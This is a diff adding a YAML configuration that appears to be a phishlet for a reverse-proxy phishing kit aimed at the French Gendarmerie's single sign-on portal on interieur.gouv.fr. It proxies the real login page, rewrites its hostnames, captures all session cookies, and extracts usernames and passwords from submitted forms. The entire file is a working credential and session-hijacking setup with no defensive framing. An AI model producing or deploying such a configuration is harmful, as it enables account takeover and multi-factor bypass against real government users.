@@ -1,0 +1,21 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'auth.sso.gendarmerie', orig_sub: 'auth.sso.gendarmerie', domain: 'interieur.gouv.fr', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'auth.sso.gendarmerie.interieur.gouv.fr', orig_sub: 'auth.sso.gendarmerie', domain: 'interieur.gouv.fr', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: 'auth.sso.gendarmerie.interieur.gouv.fr'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'auth.sso.gendarmerie.interieur.gouv.fr'
+  path: '/' 
